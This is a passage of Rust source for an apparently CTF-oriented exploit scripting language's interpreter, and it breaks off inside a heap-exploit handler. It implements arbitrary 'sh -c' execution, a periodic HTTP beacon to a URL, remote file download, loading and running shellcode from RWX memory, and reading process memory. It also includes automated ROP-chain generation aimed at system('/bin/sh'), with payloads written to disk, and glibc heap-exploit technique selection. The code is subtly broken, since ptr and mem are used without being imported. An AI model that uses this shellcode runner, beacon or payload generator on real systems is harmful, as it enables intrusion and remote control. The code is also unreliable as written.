use std::process::{Command as SysCommand, Stdio};
use std::fs;
use std::io::{Read, Seek, SeekFrom, Write};
use std::time::Duration;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use tokio::sync::{RwLock, Mutex};
use regex::Regex;
use tokio; // For async runtime
use reqwest::blocking::Client;
use base64::{encode, decode};
use rand::Rng;
use hex;
use capstone::{Capstone, arch::x86::ArchMode, arch::BuildsCapstone};
#[cfg(unix)]
use libc;

use crate::ast::{
    Command, Expr, Literal, Control, TypeHint, TypedVar,
    FunctionDef, MatchBlock, TryCatch, MacroDef,
};
use crate::parser::parse_script;
use crate::runtime_safety::{RuntimeSafety, SafetyConfig};
use crate::ctf_helpers::FlagFinder;
use crate::interactive_io::{Socket, Process};

// Global connection storage
type ConnectionId = u64;

enum Connection {
    Socket(Socket),
    Process(Process),
}

struct ConnectionRegistry {
    connections: HashMap<ConnectionId, Connection>,
    next_id: ConnectionId,
}

impl ConnectionRegistry {
    fn new() -> Self {
        ConnectionRegistry {
            connections: HashMap::new(),
            next_id: 1,
        }
    }
    
    fn add_socket(&mut self, socket: Socket) -> ConnectionId {
        let id = self.next_id;
        self.next_id += 1;
        self.connections.insert(id, Connection::Socket(socket));
        id
    }
    
    fn add_process(&mut self, process: Process) -> ConnectionId {
        let id = self.next_id;
        self.next_id += 1;
        self.connections.insert(id, Connection::Process(process));
        id
    }
    
    fn get_mut(&mut self, id: ConnectionId) -> Option<&mut Connection> {
        self.connections.get_mut(&id)
    }
}

lazy_static::lazy_static! {
    static ref CONNECTIONS: Arc<Mutex<ConnectionRegistry>> = Arc::new(Mutex::new(ConnectionRegistry::new()));
}

pub fn run_repl() {
    crate::repl::run_repl();
}

#[tokio::main]
pub async fn interpret(commands: &[Command]) -> Result<(), String> {
    let shellcode = Arc::new(RwLock::new(None));
    let variables = Arc::new(RwLock::new(HashMap::new()));
    let constants = Arc::new(RwLock::new(HashMap::new()));
    let functions = Arc::new(RwLock::new(HashMap::new()));
    let macros = Arc::new(RwLock::new(HashMap::new()));
    let safety = Arc::new(RwLock::new(RuntimeSafety::new(SafetyConfig::default())));
    interpret_with_scope(commands, variables, constants, functions, macros, shellcode, safety).await?;
    Ok(())
}

// Enhanced value type for advanced data structures
#[derive(Debug, Clone, PartialEq)]
pub enum Value {
    Number(i64),
    String(String),
    List(Vec<Value>),
    Map(HashMap<String, Value>),
    Set(HashSet<String>),
    Bytes(Vec<u8>),
    Null,
}

impl std::fmt::Display for Value {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Value::Number(n) => write!(f, "{}", n),
            Value::String(s) => write!(f, "{}", s),
            Value::List(l) => write!(f, "[{}]", l.iter().map(|v| v.to_string()).collect::<Vec<_>>().join(", ")),
            Value::Map(m) => write!(f, "{{{}}}", m.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join(", ")),
            Value::Set(s) => write!(f, "#{{{}}}", s.iter().map(|x| x.as_str()).collect::<Vec<_>>().join(", ")),
            Value::Bytes(b) => write!(f, "0x{}", hex::encode(b)),
            Value::Null => write!(f, "null"),
        }
    }
}

fn interpret_with_scope<'a>(
    commands: &'a [Command],
    variables: Arc<RwLock<HashMap<String, Value>>>,
    constants: Arc<RwLock<HashMap<String, Value>>>,
    functions: Arc<RwLock<HashMap<String, FunctionDef>>>,
    macros: Arc<RwLock<HashMap<String, MacroDef>>>,
    shellcode: Arc<RwLock<Option<Vec<u8>>>>,
    safety: Arc<RwLock<RuntimeSafety>>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Option<Value>, String>> + Send + 'a>> {
    Box::pin(async move {
    for cmd in commands {
        match cmd {
            Command::Import { module, items } => {
                let content = fs::read_to_string(module).map_err(|e| format!("Failed to read module {}: {}", module, e))?;
                let imported_cmds = parse_script(&content)?;
                let mut filtered = Vec::new();
                if let Some(items) = items {
                    for c in &imported_cmds {
                        match c {
                            Command::DefineFunction(f) if items.contains(&f.name) => filtered.push(c.clone()),
                            Command::DefineMacro(m) if items.contains(&m.name) => filtered.push(c.clone()),
                            _ => {}
                        }
                    }
                } else {
                    filtered = imported_cmds;
                }
                interpret_with_scope(&filtered, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await?;
            }
            Command::TypedDecl(TypedVar { name, var_type, value }) => {
                let val = eval_expr(value, variables.clone(), functions.clone(), macros.clone()).await?;
                let typed_val = match var_type {
                    TypeHint::Int => Value::Number(val.to_string().parse::<i64>()
                        .map_err(|e| format!("[ERROR] Type Error: Expected integer, got '{}'\nMake sure the value is a valid number: {}", val, e))?),
                    TypeHint::String => Value::String(val.to_string()),
                    TypeHint::List => Value::List(val.to_string().split(',').map(|s| Value::String(s.trim().to_string())).collect()),
                    TypeHint::Map => Value::Map(val.to_string().split(',').map(|pair| {
                        let parts: Vec<&str> = pair.split(':').collect();
                        (parts[0].trim().to_string(), Value::String(parts[1].trim().to_string()))
                    }).collect()),
                    TypeHint::Set => Value::Set(val.to_string().split(',').map(|s| s.trim().to_string()).collect()),
                    TypeHint::Bytes => Value::Bytes(hex::decode(val.to_string().trim_start_matches("0x")).map_err(|e| e.to_string())?),
                    TypeHint::Unknown => val,
                    TypeHint::Null => if val == Value::Null { val } else { 
                        return Err(format!("[ERROR] Type Error: Expected null, got '{}'\nUse 'null' for null values", val));
                    },
                };
                variables.write().await.insert(name.clone(), typed_val);
            }
            Command::ConstDecl { name, value } => {
                let val = eval_expr(value, variables.clone(), functions.clone(), macros.clone()).await?;
                constants.write().await.insert(name.clone(), val);
            }
            Command::DestructuringDecl { vars, value } => {
                let val = eval_expr(value, variables.clone(), functions.clone(), macros.clone()).await?;
                let val_str = val.to_string();
                let parts: Vec<&str> = val_str.split(':').collect();
                if parts.len() != vars.len() {
                    return Err(format!("Destructuring mismatch: {} vars, {} values", vars.len(), parts.len()));
                }
                for (var, part) in vars.iter().zip(parts) {
                    variables.write().await.insert(var.clone(), Value::String(part.trim().to_string()));
                }
            }
            Command::VarDecl { name, value } => {
                let val = eval_expr(value, variables.clone(), functions.clone(), macros.clone()).await?;
                variables.write().await.insert(name.clone(), val);
            }
            Command::Assignment { name, value } => {
                if constants.read().await.contains_key(name) {
                    return Err(format!("Cannot reassign constant {}", name));
                }
                let val = eval_expr(value, variables.clone(), functions.clone(), macros.clone()).await?;
                variables.write().await.insert(name.clone(), val);
            }
            Command::DefineFunction(func_def) => {
                functions.write().await.insert(func_def.name.clone(), func_def.clone());
            }
            Command::DefineMacro(macro_def) => {
                macros.write().await.insert(macro_def.name.clone(), macro_def.clone());
            }
            Command::CallMacro { name, args } => {
                let macro_def = macros.read().await.get(name).cloned();
                if let Some(macro_def) = macro_def {
                    let local_vars = Arc::new(RwLock::new(variables.read().await.clone()));
                    let mut arg_values = Vec::new();
                    for e in args {
                        arg_values.push(eval_expr(e, variables.clone(), functions.clone(), macros.clone()).await?);
                    }
                    for (param, val) in macro_def.args.iter().zip(arg_values) {
                        local_vars.write().await.insert(param.clone(), val);
                    }
                    if let Some(ret) = interpret_with_scope(&macro_def.body, local_vars, constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                        println!("[MACRO RETURN] {}", ret);
                    }
                } else {
                    return Err(format!("Unknown macro: {}", name));
                }
            }
            Command::CallFunction { name, args } => {
                let func = functions.read().await.get(name).cloned();
                if let Some(func) = func {
                    let local_vars = Arc::new(RwLock::new(variables.read().await.clone()));
                    let mut arg_values = Vec::new();
                    for (i, (param_name, default)) in func.args.iter().enumerate() {
                        let arg_val = match args.get(i) {
                            Some((n, e)) => {
                                if let Some(n) = n {
                                    if n == param_name {
                                        eval_expr(e, variables.clone(), functions.clone(), macros.clone()).await?
                                    } else {
                                        return Err(format!("Argument name mismatch"));
                                    }
                                } else {
                                    eval_expr(e, variables.clone(), functions.clone(), macros.clone()).await?
                                }
                            }
                            None => {
                                if let Some(d) = default {
                                    eval_expr(d, variables.clone(), functions.clone(), macros.clone()).await?
                                } else {
                                    return Err(format!("[ERROR] Missing Argument: '{}'\n\nTIP: This function requires: {}", 
                                        param_name, 
                                        func.args.iter().map(|(n, _)| n.as_str()).collect::<Vec<_>>().join(", ")));
                                }
                            }
                        };
                        arg_values.push(arg_val);
                    }
                    for ((param_name, _), val) in func.args.iter().zip(arg_values) {
                        local_vars.write().await.insert(param_name.clone(), val);
                    }
                    if func.is_async {
                        let consts = constants.clone();
                        let funcs = functions.clone();
                        let macs = macros.clone();
                        let sc = shellcode.clone();
                        let saf = safety.clone();
                        let body = func.body.clone();
                        tokio::spawn(async move {
                            interpret_with_scope(&body, local_vars, consts, funcs, macs, sc, saf).await.unwrap();
                        }).await.map_err(|e| e.to_string())?;
                    } else if let Some(ret_val) = interpret_with_scope(&func.body, local_vars, constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                        println!("[RETURN] {}", ret_val);
                    }
                } else {
                    return Err(format!("Unknown function: {}", name));
                }
            }
            Command::Expr(Expr::Return(expr)) => {
                let ret_val = eval_expr(expr, variables.clone(), functions.clone(), macros.clone()).await?;
                return Ok(Some(ret_val));
            }
            Command::Expr(expr) => {
                let _val = eval_expr(expr, variables.clone(), functions.clone(), macros.clone()).await?;
            }
            Command::Control(Control::If { condition, then_body, else_body }) => {
                let cond = eval_expr(condition, variables.clone(), functions.clone(), macros.clone()).await?;
                if cond.to_string() == "true" || cond.to_string().parse::<i64>().map_or(false, |n| n != 0) {
                    if let Some(ret) = interpret_with_scope(then_body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                        return Ok(Some(ret));
                    }
                } else {
                    if let Some(ret) = interpret_with_scope(else_body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                        return Ok(Some(ret));
                    }
                }
            }
            Command::Control(Control::For { var, iterable, body }) => {
                let items = eval_expr(iterable, variables.clone(), functions.clone(), macros.clone()).await?;
                match items {
                    Value::List(list) => {
                        for item in list {
                            variables.write().await.insert(var.clone(), item);
                            match interpret_with_scope(body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await {
                                Ok(Some(ret)) => return Ok(Some(ret)),
                                Err(e) if e == "continue" => continue,
                                Err(e) if e == "break" => break,
                                Err(e) => return Err(e),
                                Ok(None) => {},
                            }
                        }
                    }
                    Value::String(s) => {
                        let range: Vec<_> = s.split("..").collect();
                        if range.len() == 2 {
                            let start = range[0].parse::<i64>().map_err(|e| e.to_string())?;
                            let end = range[1].parse::<i64>().map_err(|e| e.to_string())?;
                            for i in start..end {
                                variables.write().await.insert(var.clone(), Value::Number(i));
                                match interpret_with_scope(body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await {
                                    Ok(Some(ret)) => return Ok(Some(ret)),
                                    Err(e) if e == "continue" => continue,
                                    Err(e) if e == "break" => break,
                                    Err(e) => return Err(e),
                                    Ok(None) => {},
                                }
                            }
                        } else {
                            return Err("[ERROR] Invalid Range: Expected format 'x..y'\n\nTIP: Example: for i in 0..10".into());
                        }
                    }
                    _ => return Err("[ERROR] For Loop Error: Requires a list or range\n\nTIP: Examples:\n  for i in 0..10\n  for item in my_list".into()),
                }
            }
            Command::Control(Control::While { condition, body }) => {
                loop {
                    let cond = eval_expr(condition, variables.clone(), functions.clone(), macros.clone()).await?;
                    let cond_bool = match cond {
                        Value::Number(n) => n != 0,
                        Value::String(s) => s == "true" || s.parse::<i64>().map_or(false, |n| n != 0),
                        _ => cond.to_string() == "true",
                    };
                    if !cond_bool {
                        break;
                    }
                    match interpret_with_scope(body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await {
                        Ok(Some(ret)) => return Ok(Some(ret)),
                        Err(e) if e == "continue" => continue,
                        Err(e) if e == "break" => break,
                        Err(e) => return Err(e),
                        Ok(None) => {},
                    }
                }
            }
            Command::Control(Control::Break) => {
                return Err("break".into());
            }
            Command::Control(Control::Continue) => {
                return Err("continue".into());
            }
            Command::Control(Control::Parallel { body }) => {
                let mut handles = Vec::new();
                for cmd in body {
                    let cmd = cmd.clone();
                    let vars = variables.clone();
                    let consts = constants.clone();
                    let funcs = functions.clone();
                    let macs = macros.clone();
                    let sc = shellcode.clone();
                    let saf = safety.clone();
                    handles.push(tokio::spawn(async move {
                        interpret_with_scope(&[cmd], vars, consts, funcs, macs, sc, saf).await
                    }));
                }
                for handle in handles {
                    handle.await.map_err(|e| e.to_string())??;
                }
            }
            Command::Match(MatchBlock { expr, arms }) => {
                let val = eval_expr(expr, variables.clone(), functions.clone(), macros.clone()).await?;
                for arm in arms {
                    let _pat_val = eval_expr(&arm.pattern, variables.clone(), functions.clone(), macros.clone()).await?;
                    let matches = match (&arm.pattern, &val) {
                        (Expr::Literal(Literal::String(s)), Value::String(v)) => s == v,
                        (Expr::Literal(Literal::Number(n)), Value::Number(v)) => n == v,
                        _ => false,
                    };
                    let guard_ok = if let Some(g) = &arm.guard {
                        let guard_val = eval_expr(g, variables.clone(), functions.clone(), macros.clone()).await?;
                        guard_val.to_string() == "true"
                    } else {
                        true
                    };
                    if matches && guard_ok {
                        if let Some(ret) = interpret_with_scope(&arm.body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                            return Ok(Some(ret));
                        }
                        break;
                    }
                }
            }
            Command::TryCatch(TryCatch { try_body, catch_var, catch_body }) => {
                match interpret_with_scope(try_body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await {
                    Ok(Some(ret)) => return Ok(Some(ret)),
                    Err(e) => {
                        variables.write().await.insert(catch_var.clone(), Value::String(e));
                        if let Some(ret) = interpret_with_scope(catch_body, variables.clone(), constants.clone(), functions.clone(), macros.clone(), shellcode.clone(), safety.clone()).await? {
                            return Ok(Some(ret));
                        }
                    }
                    _ => {}
                }
            }
            Command::RunCommand { command } => {
                let output = SysCommand::new("sh").arg("-c").arg(command).output().map_err(|e| e.to_string())?;
                println!("{}", String::from_utf8_lossy(&output.stdout));
            }
            Command::BitwiseOp { op, left, right } => {
                let l = eval_expr(left, variables.clone(), functions.clone(), macros.clone()).await?;
                let r = eval_expr(right, variables.clone(), functions.clone(), macros.clone()).await?;
                let l_num = l.to_string().parse::<i64>().unwrap_or(0);
                let r_num = r.to_string().parse::<i64>().unwrap_or(0);
                let result = match op.as_str() {
                    "&" => l_num & r_num,
                    "|" => l_num | r_num,
                    "^" => l_num ^ r_num,
                    "<<" => l_num << r_num,
                    ">>" => l_num >> r_num,
                    _ => return Err(format!("Unknown bitwise op: {}", op)),
                };
                variables.write().await.insert("result".to_string(), Value::Number(result));
            }
            Command::ToolExec { tool, args } => {
                let mut arg_vals = Vec::new();
                for e in args {
                    arg_vals.push(eval_expr(e, variables.clone(), functions.clone(), macros.clone()).await?);
                }
                match tool.as_str() {
                    "metasploit" => println!("[METASPLOIT] Args: {:?}", arg_vals),
                    "capstone" => println!("[CAPSTONE] Args: {:?}", arg_vals),
                    _ => return Err(format!("Unknown tool: {}", tool)),
                }
            }
            Command::Beacon { url, interval } => {
                let url = url.clone();
                let int = *interval;
                tokio::spawn(async move {
                    let client = Client::new();
                    loop {
                        let _ = client.get(&url).send();
                        tokio::time::sleep(Duration::from_secs(int)).await;
                    }
                });
            }
            Command::Download { url, path } => {
                let data = Client::new().get(url).send().map_err(|e| e.to_string())?.bytes().map_err(|e| e.to_string())?;
                fs::write(path, &data).map_err(|e| e.to_string())?;
            }
            Command::EncodeBase64 { data } => {
                let val = eval_expr(data, variables.clone(), functions.clone(), macros.clone()).await?;
                println!("[ENCODED] {}", encode(val.to_string()));
            }
            Command::DecodeBase64 { data } => {
                let val = eval_expr(data, variables.clone(), functions.clone(), macros.clone()).await?;
                let raw = decode(&val.to_string()).map_err(|e| e.to_string())?;
                println!("[DECODED] {}", String::from_utf8_lossy(&raw));
            }
            Command::Assemble { code } => {
                println!("[ASM] Assembly feature disabled. Use external assembler (nasm/as) instead.");
                println!("[ASM] Code: {}", code);
            }
            Command::LoadShellcode { path } => {
                *shellcode.write().await = Some(fs::read(path).map_err(|e| e.to_string())?);
            }
            Command::ExecuteShellcode => {
                if let Some(code) = shellcode.read().await.as_ref() {
                    println!("[SHELLCODE] Executing {} bytes", code.len());
                    let cs = Capstone::new().x86().mode(ArchMode::Mode64).build().ok();
                    if let Some(cs) = cs {
                        if let Ok(insns) = cs.disasm_all(&code, 0x1000) {
                            println!("[TRACE]");
                            for i in insns.iter().take(20) {
                                println!("   0x{:x}: {}", i.address(), i);
                            }
                        }
                    }

                    #[cfg(unix)]
                    {
                        let addr = unsafe {
                            libc::mmap(
                                ptr::null_mut(),
                                code.len(),
                                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
                                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                                -1, 0
                            )
                        };
                        if addr == libc::MAP_FAILED {
                            return Err("mmap failed".into());
                        }

                        unsafe {
                            ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len());
                            let shell_fn: fn() = mem::transmute(addr);
                            shell_fn();
                        }
                    }
                    #[cfg(not(unix))]
                    {
                        println!("[SHELLCODE] Execution is only supported on Unix platforms");
                    }
                } else {
                    println!("[SHELLCODE] No shellcode loaded.");
                }
            }
            Command::DumpMemory { address, length } => {
                let mut file = fs::File::open("/proc/self/mem").map_err(|e| e.to_string())?;
                file.seek(SeekFrom::Start(*address)).map_err(|e| e.to_string())?;
                let mut buffer = vec![0u8; *length as usize];
                file.read_exact(&mut buffer).map_err(|e| e.to_string())?;
                println!("[DUMP]");
                for (i, b) in buffer.iter().enumerate() {
                    if i % 16 == 0 { print!("\n{:08x}: ", address + i as u64); }
                    print!("{:02x} ", b);
                }
                println!();
            }
            Command::NopSled { length } => {
                println!("[NOP] {}", "90 ".repeat(*length as usize));
            }
            Command::HeapSpray { data } => {
                println!("[HEAP] Spray: {:?}", data.as_bytes());
            }
            Command::Fuzz { binary, seed, cycles } => {
                let seed_data = fs::read(seed).map_err(|e| e.to_string())?;
                for i in 0..*cycles {
                    let mut input = seed_data.clone();
                    let mut rng = rand::thread_rng();
                    for _ in 0..rng.gen_range(1..5) {
                        let idx = rng.gen_range(0..input.len());
                        input[idx] = rng.gen();
                    }
                    let mut child = SysCommand::new(binary)
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
                        .spawn().map_err(|e| e.to_string())?;
                    if let Some(stdin) = child.stdin.as_mut() {
                        stdin.write_all(&input).map_err(|e| e.to_string())?;
                    }
                    let status = child.wait().map_err(|e| e.to_string())?;
                    if !status.success() {
                        let path = format!("crash_{}.bin", i);
                        fs::write(&path, &input).map_err(|e| e.to_string())?;
                        println!("[FUZZ] Crash saved to {}", path);
                    }
                }
            }
            Command::CTF(ctf_cmd) => {
                use crate::ast::CTFCommand;
                match ctf_cmd {
                    CTFCommand::NewSession { name } => {
                        println!("[CTF] Creating new session: {}", name);
                    }
                    CTFCommand::AddChallenge { id: _, name, category, points } => {
                        println!("[CTF] Adding challenge: {} ({}) - {} pts", name, category, points);
                    }
                    CTFCommand::SetConnection { challenge_id, host, port, protocol } => {
                        println!("[CTF] Setting connection for {}: {}:{} ({})", challenge_id, host, port, protocol);
                    }
                    CTFCommand::AddNote { challenge_id, note } => {
                        println!("[CTF] Note for {}: {}", challenge_id, note);
                    }
                    CTFCommand::SetStatus { challenge_id, status } => {
                        println!("[CTF] Status for {}: {}", challenge_id, status);
                    }
                    CTFCommand::SubmitFlag { challenge_id, flag } => {
                        println!("[CTF] Submitting flag for {}: {}", challenge_id, flag);
                    }
                    CTFCommand::SaveSession { path } => {
                        println!("[CTF] Saving session to: {}", path);
                    }
                    CTFCommand::LoadSession { path } => {
                        println!("[CTF] Loading session from: {}", path);
                    }
                    CTFCommand::ShowStats => {
                        println!("[CTF] Showing session statistics");
                    }
                    CTFCommand::ListChallenges => {
                        println!("[CTF] Listing challenges");
                    }
                }
            }
            Command::DiffFuzz(spec) => {
                use crate::diff_fuzzer::{DifferentialFuzzer, DetectionMode};
                
                println!("[DIFF-FUZZ] Initializing differential fuzzer");
                
                let mut fuzzer = DifferentialFuzzer::new(
                    spec.target_old.clone(),
                    spec.target_new.clone()
                );
                
                fuzzer.load_corpus(&spec.corpus)?;
                
                if let Some(iterations) = spec.iterations {
                    fuzzer.set_iterations(iterations);
                }
                
                if let Some(timeout) = spec.timeout_ms {
                    fuzzer.set_timeout(timeout);
                }
                
                for mode_str in &spec.detect_modes {
                    let mode = match mode_str.as_str() {
                        "crashes_only_in_old" => DetectionMode::CrashesOnlyInOld,
                        "crashes_only_in_new" => DetectionMode::CrashesOnlyInNew,
                        "behavior_change" => DetectionMode::BehaviorChange,
                        "output_divergence" => DetectionMode::OutputDivergence,
                        "timing_divergence" => DetectionMode::TimingDivergence,
                        "sanitizer_violations" => DetectionMode::SanitizerViolations,
                        "return_code_change" => DetectionMode::ReturnCodeChange,
                        _ => return Err(format!("Unknown detection mode: {}", mode_str)),
                    };
                    fuzzer.add_detection_mode(mode);
                }
                
                fuzzer.fuzz()?;
                
                if spec.auto_exploit {
                    fuzzer.save_report("differential_fuzz_report.json")?;
                }
            }
            Command::TaintAnalysis(spec) => {
                use crate::advanced_fuzzer::{TaintTracker, TaintSink, LeakType};
                
                println!("[TAINT] Initializing taint analysis");
                println!("[TAINT]   Binary: {}", spec.binary);
                println!("[TAINT]   Source: {}", spec.source);
                
                let mut tracker = TaintTracker::new();
                
                for sink_str in &spec.track_to {
                    let sink = match sink_str.as_str() {
                        "stdout" => TaintSink::Stdout,
                        "stderr" => TaintSink::Stderr,
                        s if s.starts_with("socket:") => {
                            TaintSink::Socket(s.strip_prefix("socket:").unwrap().to_string())
                        }
                        s if s.starts_with("file_write:") => {
                            TaintSink::FileWrite(s.strip_prefix("file_write:").unwrap().to_string())
                        }
                        _ => return Err(format!("[ERROR] Unknown sink: {}\n\nTIP: Valid sinks: stdout, stderr, socket:<addr>, file_write:<path>", sink_str)),
                    };
                    tracker.add_sink(sink);
                }
                
                for alert_str in &spec.alert_on {
                    let alert = match alert_str.as_str() {
                        "stack_address_leak" => LeakType::StackAddressLeak,
                        "heap_address_leak" => LeakType::HeapAddressLeak,
                        "canary_leak" => LeakType::CanaryLeak,
                        "pie_base_leak" => LeakType::PIEBaseLeak,
                        "libc_base_leak" => LeakType::LibcBaseLeak,
                        "generic_info_leak" => LeakType::GenericInfoLeak,
                        _ => return Err(format!("[ERROR] Unknown leak type: {}\n\nTIP: Valid types: stack_address_leak, heap_address_leak, canary_leak, pie_base_leak, libc_base_leak, generic_info_leak", alert_str)),
                    };
                    tracker.add_alert_pattern(alert);
                }
                
                let result = tracker.analyze_binary(&spec.binary)?;
                
                println!("\n[TAINT] ═══════════════════════════════════════════════════════════════");
                println!("[TAINT] TAINT ANALYSIS SUMMARY");
                println!("[TAINT] ═══════════════════════════════════════════════════════════════");
                println!("[TAINT]   Binary: {}", result.binary);
                println!("[TAINT]   Test Inputs: {}", result.total_inputs_tested);
                println!("[TAINT]   Total Leaks: {}", result.leaks_detected.len());
                println!("[TAINT]   Critical: {}", result.critical_count);
                println!("[TAINT]   High: {}", result.high_count);
                println!("[TAINT] ═══════════════════════════════════════════════════════════════");
                
                if !result.leaks_detected.is_empty() {
                    println!("\n[TAINT] WARNING: LEAKS DETECTED:");
                    for (i, leak) in result.leaks_detected.iter().take(5).enumerate() {
                        println!("[TAINT]   {}. {:?} - Severity: {:?} (Exploitability: {:.0}%)", 
                                 i + 1, leak.leak_type, leak.severity, leak.exploitability);
                    }
                    if result.leaks_detected.len() > 5 {
                        println!("[TAINT]   ... and {} more", result.leaks_detected.len() - 5);
                    }
                    println!("\n[TAINT] Detailed reports saved as: taint_leak_*.txt");
                }
            }
            Command::AutoROP(spec) => {
                use crate::rop_tools::{AutoROPSolver, ROPGoal, Constraint, ROPStrategy};
                
                println!("[AUTO-ROP] Initializing automated ROP solver");
                println!("[AUTO-ROP]   Binary: {}", spec.binary);
                
                let mut solver = AutoROPSolver::new(&spec.binary)?;
                
                if let Some(libc_path) = &spec.libc_path {
                    solver.set_libc(libc_path, spec.libc_base)?;
                }
                
                for constraint_str in &spec.constraints {
                    let constraint = match constraint_str.as_str() {
                        "no_nulls" => Constraint::NoNullBytes,
                        "alphanumeric" => Constraint::AlphanumericOnly,
                        s if s.starts_with("max_length:") => {
                            let len = s.strip_prefix("max_length:").unwrap().trim().parse::<usize>()
                                .map_err(|_| format!("[ERROR] Invalid max_length value: {}", s))?;
                            Constraint::MaxLength(len)
                        }
                        s if s.starts_with("preserve_") => {
                            let reg = s.strip_prefix("preserve_").unwrap().to_string();
                            Constraint::PreserveRegister(reg)
                        }
                        _ => return Err(format!("[ERROR] Unknown constraint: {}\n\nTIP: Valid constraints: no_nulls, alphanumeric, max_length:<n>, preserve_<reg>", constraint_str)),
                    };
                    solver.add_constraint(constraint);
                }
                
                let goal = if spec.goal.starts_with("system(") {
                    let cmd = spec.goal.strip_prefix("system(").and_then(|s| s.strip_suffix(")"))
                        .unwrap_or("/bin/sh");
                    ROPGoal::System(cmd.trim_matches('"').to_string())
                } else if spec.goal.starts_with("execve(") {
                    let cmd = spec.goal.strip_prefix("execve(").and_then(|s| s.strip_suffix(")"))
                        .unwrap_or("/bin/sh");
                    ROPGoal::Execve(cmd.trim_matches('"').to_string(), vec![])
                } else if spec.goal.starts_with("mprotect_rwx") {
                    ROPGoal::Mprotect(0x600000, 0x1000, 7)
                } else {
                    ROPGoal::Custom(spec.goal.clone())
                };
                
                let mut strategies = Vec::new();
                for pref in &spec.prefer {
                    let strategy = match pref.as_str() {
                        "one_gadget" => ROPStrategy::OneGadget,
                        "ret2libc" => ROPStrategy::Ret2Libc,
                        "mprotect_rwx" => ROPStrategy::MprotectRWX,
                        "ret2syscall" => ROPStrategy::Ret2Syscall,
                        "srop" => ROPStrategy::SROP,
                        "jop" => ROPStrategy::JOP,
                        "cop" => ROPStrategy::COP,
                        "stack_pivot" => ROPStrategy::StackPivot,
                        _ => return Err(format!("[ERROR] Unknown strategy: {}\n\nTIP: Valid strategies: one_gadget, ret2libc, mprotect_rwx, ret2syscall, srop, jop, cop, stack_pivot", pref)),
                    };
                    strategies.push(strategy);
                }
                
                let solution = solver.solve(goal, strategies)?;
                
                println!("\n[AUTO-ROP] ═══════════════════════════════════════════════════════════════");
                println!("[AUTO-ROP] ROP CHAIN SOLUTION");
                println!("[AUTO-ROP] ═══════════════════════════════════════════════════════════════");
                println!("[AUTO-ROP]   Strategy: {}", solution.strategy);
                println!("[AUTO-ROP]   Chain length: {} gadgets", solution.gadgets_used.len());
                println!("[AUTO-ROP]   Payload size: {} bytes", solution.chain_bytes.len());
                println!("[AUTO-ROP]   Success probability: {:.1}%", solution.success_probability * 100.0);
                println!("[AUTO-ROP]   Description: {}", solution.payload_description);
                println!("[AUTO-ROP] ═══════════════════════════════════════════════════════════════");
                
                println!("\n[AUTO-ROP] GADGETS USED:");
                for (i, gadget) in solution.gadgets_used.iter().enumerate() {
                    println!("[AUTO-ROP]   {}. 0x{:016x} - {}", i + 1, gadget.address, gadget.purpose);
                    println!("[AUTO-ROP]      {}", gadget.instructions.join("; "));
                }
                
                println!("\n[AUTO-ROP] ROP CHAIN:");
                for (i, addr) in solution.chain.iter().enumerate() {
                    println!("[AUTO-ROP]   [{}] 0x{:016x}", i, addr);
                }
                
                let output_file = "rop_solution.json";
                solver.save_solution(&solution, output_file)?;
                println!("\n[AUTO-ROP] Full solution saved to: {}", output_file);
                
                let payload_file = "rop_payload.bin";
                std::fs::write(payload_file, &solution.chain_bytes)
                    .map_err(|e| format!("Failed to write payload: {}", e))?;
                println!("[AUTO-ROP] Binary payload saved to: {}", payload_file);
            }
            Command::HeapExploit(spec) => {
                use crate::heap_tools::{ModernHeapExploit, GlibcVersion, HeapTechnique, HeapTarget};
                
                println!("[HEAP] Initializing modern heap exploit framework");
                println!("[HEAP]   Binary: {}", spec.binary);
                println!("[HEAP]   Glibc version: {}", spec.glibc_version);
                
                let glibc_version = GlibcVersion::from_string(&spec.glibc_version)?;
                let mut exploit = ModernHeapExploit::new(&spec.binary, glibc_version);
                
                if let Some(heap_base) = spec.heap_base {
                    exploit.set_heap_base(heap_base);
                }
                
                if let Some(libc_base) = spec.libc_base {
                    exploit.set_libc_base(libc_base);
                }
                
                let technique = match spec.technique.as_str() {
                    "tcache_poisoning" => {
                        if let Some(bypass) = &spec.bypass {
                            match bypass.as_str() {
                                "safe_linking" => HeapTechnique::TcachePoisoningSafeLinking,
                                "tcache_key" | "key_validation" => HeapTechnique::TcachePoisoningKeyBypass,
                                _ => return Err(format!("[ERROR] Unknown bypass technique: {}\n\nTIP: Valid bypasses: safe_linking, tcache_key", bypass)),
                            }
                        } else {
                            HeapTechnique::TcachePoisoning
                        }
                    }
                    "fastbin_attack" => HeapTechnique::FastbinAttack,
                    "unsorted_bin_attack" => HeapTechnique::UnsortedBinAttack,
                    "largebin_attack" => HeapTechnique::LargebinAttack,
                    "house_of_force" => HeapTechnique::HouseOfForce,
                    "house_of_spirit" => HeapTechnique::HouseOfSpirit,
                    "house_of_io" => HeapTechnique::HouseOfIO,
                    "house_of_apple" => HeapTechnique::HouseOfApple,
                    "house_of_orange" => HeapTechnique::HouseOfOrange,
                    _ => return Err(format!("[ERROR] Unknown technique: {}\n\nTIP: Valid techniques: tcache_poisoning, fastbin_attack, unsorted_bin_attack, largebin_attack, house_of_force, house_of_spirit, house_of_io, house_of_apple, house_of_orange", spec.technique)),
                };
                exploit.set_technique(technique);
                
